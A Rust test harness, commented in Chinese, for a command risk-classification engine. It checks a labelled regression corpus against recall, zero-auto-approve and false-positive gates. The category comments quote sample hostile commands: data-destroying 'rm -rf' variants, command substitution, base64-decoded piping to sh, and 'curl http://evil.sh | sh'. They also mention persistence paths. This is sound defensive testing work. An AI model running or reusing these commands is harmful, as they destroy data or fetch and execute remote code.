//! 命令风险分级的**回归语料库**（总设计 §8.1：「AI 功能的核心测试资产」）。
//!
//! # 为什么是语料库而不是一组用例
//!
//! 策略引擎的正确性不是「这几条规则写对了」，而是「面对真实世界的输入分布，它的判定
//! 与人的判断一致」。规则可以互相干扰、可以被绕过、可以在某次重构后悄悄失效——
//! 唯一能持续回答「它还行不行」的东西是一批带标注的真实输入。
//!
//! 所以语料库是**产物**，不是脚手架：每发现一个绕过就往里加一条，此后永远有人守着它。
//!
//! # 门禁
//!
//! - **条数下限**：总设计 §8.1 与 M2 出口都写「初始 ≥200 条」。少于这个数即红
//!   ——防止哪天有人把语料删剩几条还以为门禁在跑。
//! - **类目覆盖**：§8.1 点名的必测类目每一类都必须有样本，且每类有条数下限。
//! - **dangerous 组召回率 ≥95%**（M2 出口原文，与总设计 §9 Phase 2 出口逐字对齐）。
//! - **零漏放**：任何 dangerous 样本被判成 `read_only` 都直接判红，不计入召回率的宽容额度。
//!   这一条比召回率更硬：95% 的额度是留给「判成 write 而非 dangerous」这种**降级**的，
//!   不是留给「判成自动放行」的。一条 `rm -rf /` 被自动执行和被少问一次确认，
//!   不是同一个量级的错误。
//! - **read_only 组不得被误判为 dangerous 超过阈值**：假阳性会把用户训练成闭眼点确认，
//!   那比漏检更难挽回，所以它也要有门禁。

use fs_policy::{classify, Tier};

/// 一条语料。
#[derive(Debug)]
struct Case {
    expected: Tier,
    category: String,
    command: String,
    /// 来源文件与行号，报错时指得回去。
    origin: String,
}

/// §8.1 点名的必测类目 + 本引擎自己的分区。每类的条数下限。
///
/// 下限不是「凑数」：它防的是「某一类被整类删掉而总数仍然达标」。
/// 加类目要同步加下限；删类目要说明理由。
const REQUIRED_CATEGORIES: &[(&str, usize)] = &[
    // ── §8.1「绕过/混淆子集」逐条 ──
    ("compound", 8),     // 复合命令 `ls; rm -rf ~`
    ("substitution", 8), // 命令替换 `ls $(rm -rf /tmp/x)`
    ("encoding", 6),     // 编码 `echo … | base64 -d | sh`
    ("heredoc", 4),      // heredoc
    ("interpreter", 8),  // 解释器内联 `python -c`
    ("remote-exec", 6),  // 远程执行 `curl http://evil.sh | sh`
    ("var-assembly", 6), // 元字符拼装 `a=rm; $a -rf /`
    ("quoting", 8),      // 引号/转义变体
    // ── §8.1「传输路径子集」──
    ("persistence", 8), // 持久化路径（rc 文件、Startup、LaunchAgents…）
    // ── 引擎自身的分区 ──
    ("destructive", 12),    // 直接破坏（rm -rf /、mkfs、dd）
    ("privilege", 4),       // 提权包装
    ("wrapper", 6),         // 包装器剥离（timeout/xargs/env/nohup）
    ("redirect", 6),        // 重定向写入
    ("parse-error", 5),     // 解析失败 → dangerous
    ("readonly", 30),       // 必须保持自动放行的日常只读操作
    ("ordinary-write", 12), // 必须是 write 而非 dangerous 的日常写操作
];

/// 语料总数下限（总设计 §8.1 / M2 出口：「初始 ≥200 条」）。
const MIN_CASES: usize = 200;

/// dangerous 组召回率下限（M2 出口原文）。
const MIN_DANGEROUS_RECALL: f64 = 0.95;

/// read_only 组被误判为 dangerous 的比例上限。
///
/// 为什么这条也要设闸：假阳性不会造成事故，但会造成**习惯**——用户对 `ls` 也要点确认，
/// 几天之后他会闭着眼点，或者去关掉总开关。到那时真正的 `rm -rf /` 也会被点过。
/// 所以误报率是安全指标，不是体验指标。
const MAX_READONLY_OVERBLOCK: f64 = 0.0;

/// 语料里表示换行的标记。
///
/// **刻意不用 `\n` 转义。** 反斜杠在这条链路上要穿过 shell、脚本、TSV、Rust 四层，
/// 每一层都对它有自己的看法——第一版就是在这上面卡住的：写进去的 `\\n` 到了文件里
/// 变成了真换行，于是一条 `ls` + `rm -rf /` 的复合命令被 TSV 切成两行，
/// 第二行的首列成了 `rm`，加载器报「无法识别的期望级别」。
///
/// 而语料里**大量**命令本身就带反斜杠（`r\m -rf /`、`find … -exec … \;`），
/// 它们必须原样保留。所以换行用一个在 shell 里没有任何含义的标记，
/// 与反斜杠彻底脱钩。
const NEWLINE_MARKER: &str = "<NL>";

/// 把 `<NL>` 还原成真换行。除此之外不做任何转义处理——
/// 命令里的反斜杠、引号、`$` 一律原样交给被测的解析器。
fn unescape(s: &str) -> String {
    s.replace(NEWLINE_MARKER, "\n")
}

fn load() -> Vec<Case> {
    let dir = concat!(env!("CARGO_MANIFEST_DIR"), "/tests/corpus");
    let mut cases = Vec::new();
    let mut files: Vec<_> = std::fs::read_dir(dir)
        .unwrap_or_else(|e| panic!("读不到语料目录 {dir}：{e}"))
        .map(|e| e.unwrap().path())
        .filter(|p| p.extension().is_some_and(|x| x == "tsv"))
        .collect();
    files.sort();
    assert!(!files.is_empty(), "语料目录 {dir} 下没有 .tsv 文件");

    for path in files {
        let text = std::fs::read_to_string(&path).unwrap();
        let name = path.file_name().unwrap().to_string_lossy().to_string();
        for (n, line) in text.lines().enumerate() {
            let line = line.trim_end_matches('\r');
            if line.trim().is_empty() || line.trim_start().starts_with('#') {
                continue;
            }
            let mut parts = line.splitn(3, '\t');
            let (tier, category, command) = (
                parts.next().unwrap_or("").trim(),
                parts.next().unwrap_or("").trim(),
                parts.next().unwrap_or(""),
            );
            let origin = format!("{name}:{}", n + 1);
            let expected = Tier::from_str_exact(tier).unwrap_or_else(|| {
                panic!("{origin}：无法识别的期望级别 {tier:?}（须为 read_only/write/dangerous）")
            });
            assert!(
                !command.is_empty(),
                "{origin}：命令为空（列格式是 tier<TAB>category<TAB>command）"
            );
            // TSV 是按行切的，所以多行命令（heredoc、换行分隔的复合命令）必须转义。
            // 不转义的话一条 `ls\nrm -rf /` 会被切成两行，第二行的第一列变成 `rm`，
            // 解析器报「无法识别的期望级别」——那是第一版的实际表现。
            let command = unescape(command);
            assert!(
                REQUIRED_CATEGORIES.iter().any(|(c, _)| *c == category),
                "{origin}：类目 {category:?} 不在 REQUIRED_CATEGORIES 里。\
                 新增类目要同时加条数下限，否则它会成为一个没人守的空类"
            );
            cases.push(Case {
                expected,
                category: category.to_string(),
                command: command.to_string(),
                origin,
            });
        }
    }
    cases
}

#[test]
fn corpus_meets_the_size_and_coverage_floors() {
    let cases = load();
    assert!(
        cases.len() >= MIN_CASES,
        "语料只有 {} 条，低于下限 {MIN_CASES}（总设计 §8.1 / M2 出口：初始 ≥200 条）",
        cases.len()
    );
    for (cat, min) in REQUIRED_CATEGORIES {
        let n = cases.iter().filter(|c| c.category == *cat).count();
        assert!(
            n >= *min,
            "类目 `{cat}` 只有 {n} 条，低于下限 {min}——§8.1 点名的必测类目不得留空"
        );
    }
    // 三个级别都得有样本，否则某一档的判定完全没人验
    for t in [Tier::ReadOnly, Tier::Write, Tier::Dangerous] {
        let n = cases.iter().filter(|c| c.expected == t).count();
        assert!(n >= 20, "期望为 {t} 的样本只有 {n} 条，太少");
    }
}

#[test]
fn no_dangerous_case_is_ever_auto_approved() {
    // 比召回率更硬的一条：**零漏放**。
    // 召回率的 5% 额度留给「dangerous 被判成 write」（少问一次强确认），
    // 绝不留给「dangerous 被判成 read_only」（自动执行）。
    let cases = load();
    let mut leaked = Vec::new();
    for c in cases.iter().filter(|c| c.expected == Tier::Dangerous) {
        let got = classify(&c.command).tier;
        if got == Tier::ReadOnly {
            leaked.push(format!("  {} `{}` → 被自动放行", c.origin, c.command));
        }
    }
    assert!(
        leaked.is_empty(),
        "有 {} 条 dangerous 语料被判为自动放行：\n{}",
        leaked.len(),
        leaked.join("\n")
    );
}

#[test]
fn dangerous_recall_meets_the_exit_threshold() {
    let cases = load();
    let group: Vec<_> = cases
        .iter()
        .filter(|c| c.expected == Tier::Dangerous)
        .collect();
    assert!(!group.is_empty(), "dangerous 组为空，本门禁什么也没测");
    let mut missed = Vec::new();
    for c in &group {
        let got = classify(&c.command).tier;
        if got != Tier::Dangerous {
            missed.push(format!(
                "  {} [{}] `{}` → {got}",
                c.origin, c.category, c.command
            ));
        }
    }
    let recall = (group.len() - missed.len()) as f64 / group.len() as f64;
    println!(
        "dangerous 召回率 {:.1}%（{}/{}）",
        recall * 100.0,
        group.len() - missed.len(),
        group.len()
    );
    assert!(
        recall >= MIN_DANGEROUS_RECALL,
        "dangerous 召回率 {:.1}% 低于出口阈值 {:.0}%。漏掉的：\n{}",
        recall * 100.0,
        MIN_DANGEROUS_RECALL * 100.0,
        missed.join("\n")
    );
}

#[test]
fn read_only_group_is_not_over_blocked() {
    let cases = load();
    let group: Vec<_> = cases
        .iter()
        .filter(|c| c.expected == Tier::ReadOnly)
        .collect();
    assert!(!group.is_empty());
    let mut over = Vec::new();
    let mut wrong = Vec::new();
    for c in &group {
        let got = classify(&c.command).tier;
        if got == Tier::Dangerous {
            over.push(format!("  {} `{}` → dangerous", c.origin, c.command));
        } else if got != Tier::ReadOnly {
            wrong.push(format!("  {} `{}` → {got}", c.origin, c.command));
        }
    }
    let rate = over.len() as f64 / group.len() as f64;
    assert!(
        rate <= MAX_READONLY_OVERBLOCK,
        "有 {} 条只读语料被判成 dangerous（{:.1}% > 上限 {:.1}%）。\
         假阳性会把用户训练成闭眼点确认，那比漏检更难挽回：\n{}",
        over.len(),
        rate * 100.0,
        MAX_READONLY_OVERBLOCK * 100.0,
        over.join("\n")
    );
    assert!(
        wrong.is_empty(),
        "有 {} 条只读语料没有被自动放行：\n{}",
        wrong.len(),
        wrong.join("\n")
    );
}

#[test]
fn every_case_matches_its_label_exactly() {
    // 逐条精确比对。上面几条门禁给了统计学上的余量（召回率 95%），
    // 这一条不给——它是「语料与实现完全一致」的当前快照。
    // 允许它红的唯一正当理由是：刚加了一批新语料、实现还没跟上。
    // 那时应当立刻修实现或如实改标注，而不是把这条测试注掉。
    let cases = load();
    let mut bad = Vec::new();
    for c in &cases {
        let v = classify(&c.command);
        if v.tier != c.expected {
            bad.push(format!(
                "  {} [{}] `{}`\n      期望 {} 实得 {}（理由：{}）",
                c.origin,
                c.category,
                c.command,
                c.expected,
                v.tier,
                v.primary().map(|r| r.rule).unwrap_or("<无>")
            ));
        }
    }
    assert!(
        bad.is_empty(),
        "{} / {} 条语料与实现不一致：\n{}",
        bad.len(),
        cases.len(),
        bad.join("\n")
    );
}

#[test]
fn classification_is_deterministic_and_pure() {
    // 纯函数性：同一输入判两次必须完全相同。
    // 这条看着废话，但它挡住一整类实现：读环境变量、读文件系统、用 HashMap 迭代序做判定。
    // 一旦引入其中任何一个，同一条命令在两台机器上的分级就可能不同——
    // 那样既无法测试，也无法向用户解释「为什么这次要确认」。
    let cases = load();
    for c in &cases {
        let a = classify(&c.command);
        let b = classify(&c.command);
        assert_eq!(a, b, "{} 的判定不稳定", c.origin);
    }
}
